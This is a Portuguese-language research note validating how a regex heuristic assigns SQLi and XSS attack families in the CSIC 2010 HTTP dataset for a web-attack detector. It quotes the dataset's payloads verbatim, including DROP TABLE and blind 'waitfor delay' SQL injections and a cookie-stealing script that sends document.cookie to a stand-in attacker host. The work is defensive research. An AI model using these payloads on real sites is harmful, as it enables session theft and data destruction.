# Validação Manual da Atribuição de Família de Ataque

**Autor:** Pedro Henrique Juliani
**Data da validação:** 28 de julho de 2026
**Reprodução:** `python validar_familias.py` (amostragem com `random_state=7`)

---

> ## ⚠ Preciso refazer esta validação
>
> Eu rodei ela antes das quatro correções de 28/07 no `classificar_familia_ataque()`,
> então a amostra saiu de uma população que não existe mais:
>
> | | Quando eu validei | Depois das correções |
> | :--- | ---: | ---: |
> | SQLi | 468 | **1.018** |
> | XSS | 472 | **952** |
> | CRLF Injection | 0 | **388** |
> | Injeção SSI/Comando | 250 | **384** |
> | Path Traversal | 134 | **0** |
> | Tampering sem assinatura | 12.750 | **11.332** |
>
> As causas estão em `falsos_positivos_negativos.md`, Seção 11: a atribuição casava sobre
> um texto menos decodificado que o do modelo, a regex de SQLi não reconhecia `waitfor
> delay`, o byte nulo era truncado no CSV, e Path Traversal era avaliada antes de SSI e
> ficava com o `/etc/passwd` que estava dentro das diretivas `<!--#exec`.
>
> O que continua valendo aqui embaixo: as 40 amostras que eu inspecionei eram mesmo do
> tipo que a heurística disse. Nenhuma correção transformou acerto em erro, todas moveram
> ataque que estava em "tampering" para a família certa.
>
> O que não vale mais: que a heurística está certa sobre a população de hoje, que é o
> dobro da que eu amostrei. E tem uma coisa que essa validação nunca mediu, o recall da
> heurística. Só a precisão. E o recall era justamente o problema, porque eram ataques
> reais rotulados como tampering.
>
> Refazer é a pendência mais urgente do trabalho, já que o recall por família é o meu
> resultado principal.

---

## Por que eu fiz esta validação

O recall por família se tornou o resultado principal do meu trabalho — SQLi 99,1%,
XSS 100,0%, agregado de 99,6%. Mas o HTTP DATASET CSIC 2010 rotula apenas
normal/anômalo: **não existe rótulo de tipo de ataque no dataset**. A atribuição de
família é minha, feita por heurística de regex em `classificar_familia_ataque()`.

Isso significa que o meu resultado principal repousa sobre uma classificação que eu
mesmo produzi. Se a heurística estivesse errada — marcando como SQLi coisas que não
são — o número não valeria nada. Então eu inspecionei manualmente 40 amostras
aleatórias, 20 de cada família, e registro abaixo o veredito de cada uma.

Um erro que eu cometi na primeira tentativa e corrigi: imprimi as amostras truncadas
em 190 caracteres, e sete delas não mostravam ataque nenhum. Cheguei a suspeitar de
falso positivo da heurística. O problema era o truncamento — o payload estava injetado
no **último** parâmetro da requisição, depois do limite de corte. Passei a inspecionar
o texto completo, e é isso que o script faz hoje.

---

## Resultado: 40/40 corretas

| Família | Amostras inspecionadas | Corretas | Incorretas | Precisão |
| :--- | ---: | ---: | ---: | ---: |
| SQLi | 20 | 20 | 0 | 100% |
| XSS | 20 | 20 | 0 | 100% |
| **Total** | **40** | **40** | **0** | **100%** |

A heurística se sustenta na amostra inspecionada. O recall por família pode ser
reportado como resultado, com a ressalva de amostragem descrita na Seção 4.

---

## 1. SQLi — as 20 amostras

Todas contêm injeção SQL genuína. Agrupo por técnica, porque a repetição de payload é
em si um achado (Seção 3).

### 1.1 Stacked query com DROP TABLE (8 amostras: #1, #2, #7, #15, #17, #18, #20 e variantes)

```
'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%
```

**Veredito: SQLi correto.** É o padrão clássico de *stacked query*: a aspa simples
fecha o literal em que o parâmetro é interpolado, o ponto-e-vírgula encerra a
instrução original, e uma nova instrução é injetada. O `SELECT ... LIKE '%` final
serve para reequilibrar as aspas e evitar erro de sintaxe no que sobrou da query
original. Injetado em campos diferentes: `login`, `email`, `apellidos`, `dni`,
`direccion`, `pwd`.

### 1.2 DELETE FROM sem stacked query (5 amostras: #6, #9, #10, #13, #19)

```
' DELETE FROM USERS
```

**Veredito: SQLi correto.** Mais simples que o anterior — fecha a aspa e emenda um
`DELETE`. Vale registrar que este payload provavelmente **não executaria** numa query
real, porque sem `;` a concatenação resulta em SQL malformado. Mas é inequivocamente
uma *tentativa* de injeção, e é isso que um WAF deve barrar: o WAF opera sobre a
intenção observável na requisição, não sobre o resultado da execução.

### 1.3 Time-based blind SQLi com WAITFOR DELAY (7 amostras: #3, #4, #5, #8, #11, #12, #14, #16)

```
';waitfor delay '0:0:15';--
');waitfor delay '0:0:15';--
','0','0');waitfor delay '0:0:15';--
```

**Veredito: SQLi correto.** É *time-based blind SQL injection* contra SQL Server: o
atacante não recebe dados de volta, então mede o tempo de resposta. Se a página demora
15 segundos, a injeção funcionou. As variantes com `','0','0'` são tentativas de fechar
diferentes assinaturas de `INSERT INTO ... VALUES(...)`, ajustando a quantidade de
colunas até acertar. O `--` no fim comenta o resto da query original.

**Observação metodológica importante:** nessas amostras a minha regex de família casou
pelo padrão `--\s*$` (comentário SQL), não por uma palavra-chave como `SELECT` ou
`DROP`. A classificação está correta, mas foi por um casamento mais frágil do que eu
gostaria. Um `--` no fim de um campo de texto legítimo (por exemplo,
`nota 10/10 -- recomendo`) casaria pelo mesmo padrão. Registro isso como fragilidade
conhecida da heurística de rotulagem, não do modelo.

---

## 2. XSS — as 20 amostras

Todas contêm injeção de script genuína. Quatro técnicas distintas.

### 2.1 Exfiltração de cookie (6 amostras: #1, #6, #9, #11, #12, #13)

```
sessionid=12312312& username=<script>document.location='http://hacker.example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>
```

**Veredito: XSS correto.** É o caso mais grave da amostra: não apenas executa script,
mas redireciona o navegador da vítima para um host controlado pelo atacante, anexando
`document.cookie` na query string. Isso é roubo de sessão. O `sessionid=12312312`
prefixado sugere que o payload também testa *session fixation*.

### 2.2 Injeção de script com caixa mista (5 amostras: #5, #7, #16 e variantes)

```
bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org
```

**Veredito: XSS correto.** O `<SCRipt>` com caixa alternada é técnica de evasão contra
filtros que comparam string literal. O envelope de e-mail (`bob@...parosproxy.org`)
serve para passar por validação de formato de campo de e-mail, escondendo o script no
meio de algo que se parece com um endereço válido. É exatamente o tipo de ofuscação que
o meu TF-IDF de n-grams de caractere trata bem, porque `<SCRipt>` e `<script>`
compartilham quase todos os n-grams.

### 2.3 Script tag direta (5 amostras: #8, #10, #14, #18, #19)

```
<SCRIPT>alert("Paros");</SCRIPT>
```

**Veredito: XSS correto.** Prova de conceito canônica, sem ofuscação.

### 2.4 Injeção em atributo via pseudo-protocolo (4 amostras: #2, #3, #4, #15, #17, #20)

```
paros" style="background:url(javascript:alert('Paros'))
```

**Veredito: XSS correto, e é o mais interessante tecnicamente.** Não usa a tag
`<script>` em nenhum lugar. A aspa dupla fecha o atributo HTML em que o valor é
interpolado, e então injeta um atributo `style` novo cujo `url()` aponta para o
pseudo-protocolo `javascript:`. Um filtro que só procure por `<script>` passa direto.

Esta amostra é a mais valiosa para a minha defesa: mostra que o modelo detecta XSS que
não contém a assinatura mais óbvia da classe.

---

## 3. O achado que eu não esperava: baixa diversidade de templates

Contando quantos payloads **estruturalmente distintos** existem por trás da contagem de
amostras (`python validar_familias.py --templates`):

| Família | Amostras | Templates distintos | Rotas | Combinações de parâmetros |
| :--- | ---: | ---: | ---: | ---: |
| SQLi | 468 | **8** | 8 | 7 |
| XSS | 472 | **4** | 8 | 7 |

Distribuição dos templates de SQLi:

| Ocorrências | Template |
| ---: | :--- |
| 168 | `'; drop table usuarios; select * from datos where nombre like '%` |
| 106 | `' delete from users` |
| 40 | `','0','0');waitfor delay '0:0:15';--` |
| 38 | `';waitfor delay '0:0:15';--` |
| 36 | `');waitfor delay '0:0:15';--` |
| 36 | `','0','0','0','0');waitfor delay '0:0:15';--` |
| 30 | `','0','0','0');waitfor delay '0:0:15';--` |
| 14 | `','0');waitfor delay '0:0:15';--` |

E de XSS:

| Ocorrências | Template |
| ---: | :--- |
| 132 | `<script>document.location='http://hacker.example.com/...cookiesteal.cgi?'+document.cookie</script>` |
| 116 | `bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org` |
| 116 | `paros" style="background:url(javascript:alert('Paros'))` |
| 108 | `<script>alert("Paros");</script>` |

Se eu agrupar os seis variantes de `waitfor delay` como uma técnica só, o CSIC tem
**três técnicas de SQLi e quatro de XSS**.

**O que isso significa para o meu resultado.** O recall de 99,6% mede a detecção de
cerca de 12 templates injetados em 7 combinações de parâmetros ao longo de 8 rotas —
**não** de 940 ataques estruturalmente diferentes. É uma limitação do dataset, e eu
prefiro declará-la do que ser confrontado com ela.

A ocorrência da string `Paros` em todos os payloads de XSS revela a origem: o dataset
foi gerado com o **Paros Proxy**, ferramenta de teste de segurança da época. Isso
explica a baixa diversidade — são os payloads padrão de uma ferramenta, não uma coleção
curada de ataques reais.

**Consequência prática, e é uma boa notícia:** com apenas 12 templates, o experimento de
**leave-one-template-out** deixa de ser difícil e passa a ser obrigatório. Treinar
excluindo integralmente o template de injeção em atributo (`style="background:url(...)`)
e testar exclusivamente nele responde à pergunta que realmente importa: o modelo
generaliza para uma técnica que nunca viu, ou apenas memorizou as 12 que estavam no
treino? Antes desta validação eu não sabia que o experimento era tão viável.

---

## 4. Limitações desta validação

Registro o que ela **não** demonstra:

1. **Amostragem, não censo.** Inspecionei 40 de 940 amostras (4,3%). Com 40/40 corretas,
   o intervalo de confiança de 95% para a precisão da heurística fica acima de 91%
   (limite inferior de Clopper-Pearson) — suficiente para sustentar o resultado, mas não
   é prova de 100% no conjunto completo.
2. **Só validei precisão, não recall da heurística.** Confirmei que o que ela chama de
   SQLi é SQLi. **Não** verifiquei se existem ataques de SQLi que ela deixou classificados
   como "Tampering sem assinatura". Dado que ~80% das anomalias caem nessa categoria
   genérica, é plausível que haja SQLi ou XSS escondido ali. Isso subestimaria o meu
   denominador e, portanto, o resultado — ou seja, o erro seria conservador.

   > **Essa suspeita se confirmou, e é a melhor coisa deste documento.** Em 28/07 eu achei
   > exatamente o que eu tinha desconfiado aqui: 1.030 ataques de SQLi e XSS estavam
   > escondidos em "Tampering sem assinatura", por quatro bugs diferentes na heurística
   > (`falsos_positivos_negativos.md`, Seção 11). O erro era conservador mesmo, como eu
   > tinha imaginado: corrigir aumentou o meu resultado, de 940 para 1.970 ataques em
   > escopo e de 99,6% para 99,9% de recall. Ter escrito essa limitação foi o que me fez
   > ir procurar.
3. **A fragilidade do padrão `--`** descrita na Seção 1.3 é real: a heurística poderia
   classificar como SQLi um texto legítimo terminado em hífen duplo. Não encontrei
   nenhum caso na amostra, mas o risco existe.

As duas primeiras limitações estão no cronograma como trabalho do mês 2, em
`testes_futuros.md`.
